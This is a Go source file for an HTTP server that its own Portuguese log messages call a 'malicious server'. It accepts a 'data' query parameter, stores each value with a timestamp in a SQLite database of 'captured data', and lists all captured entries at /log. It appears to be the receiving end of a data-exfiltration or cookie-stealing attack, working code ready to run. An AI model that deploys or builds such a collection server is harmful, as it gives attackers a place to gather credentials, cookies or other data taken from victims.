package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3" // SQLite driver
)

var db *sql.DB // Global database connection variable

func createTable() {
	createTableSQL := `CREATE TABLE IF NOT EXISTS logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		timestamp TEXT NOT NULL,
		data TEXT NOT NULL
	);`

	_, err := db.Exec(createTableSQL)
	if err != nil {
		log.Fatalf("Error creating table: %v", err)
	}
	log.Println("Table 'logs' checked/created successfully.")
}

func handler(w http.ResponseWriter, r *http.Request) {
	data := r.URL.Query().Get("data")

	if data != "" {
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		log.Printf("[+] %s - Dado recebido: %s\n", timestamp, data)

		insertSQL := `INSERT INTO logs (timestamp, data) VALUES (?, ?)`
		_, err := db.Exec(insertSQL, timestamp, data)
		if err != nil {
			log.Printf("Erro ao inserir no banco de dados: %v\n", err)
			http.Error(w, "Erro interno", http.StatusInternalServerError)
			return
		}

		fmt.Fprintln(w, "Dado capturado com sucesso e salvo no banco de dados!")
	} else {
		log.Println("[-] Requisição recebida sem dados.")
		http.Error(w, "Nenhum dado recebido.", http.StatusBadRequest)
	}
}

func logHandler(w http.ResponseWriter, r *http.Request) {
	querySQL := `SELECT timestamp, data FROM logs ORDER BY id ASC`
	rows, err := db.Query(querySQL)
	if err != nil {
		log.Printf("Erro ao ler do banco de dados: %v\n", err)
		http.Error(w, "Erro ao ler os dados.", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var entries []string
	for rows.Next() {
		var timestamp, dataValue string
		if err := rows.Scan(&timestamp, &dataValue); err != nil {
			log.Printf("Erro ao escanear linha: %v\n", err)
			// Consider how to handle this - skip entry or return error
			continue
		}
		entries = append(entries, fmt.Sprintf("%s - %s", timestamp, dataValue))
	}

	if err = rows.Err(); err != nil { // Check for errors during iteration
		log.Printf("Erro nas linhas do banco de dados: %v", err)
		http.Error(w, "Erro ao processar dados do banco.", http.StatusInternalServerError)
		return
	}

	content := "Nenhum dado capturado ainda."
	if len(entries) > 0 {
		content = strings.Join(entries, "\n")
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(content))
}

func main() {
	var err error
	db, err = sql.Open("sqlite3", "./dados_capturados.db")
	if err != nil {
		log.Fatalf("Error opening database: %v", err)
	}
	defer db.Close()

	err = db.Ping() // Verify database connection
	if err != nil {
		log.Fatalf("Error connecting to database: %v", err)
	}
	log.Println("Database connected successfully.")

	createTable() // Create the table if it doesn't exist

	http.HandleFunc("/", handler)
	http.HandleFunc("/log", logHandler)

	porta := ":8080"
	log.Printf("Servidor malicioso escutando em %s...\n", porta)
	if err := http.ListenAndServe(porta, nil); err != nil {
		log.Fatalf("Erro ao iniciar servidor: %v\n", err)
	}
}
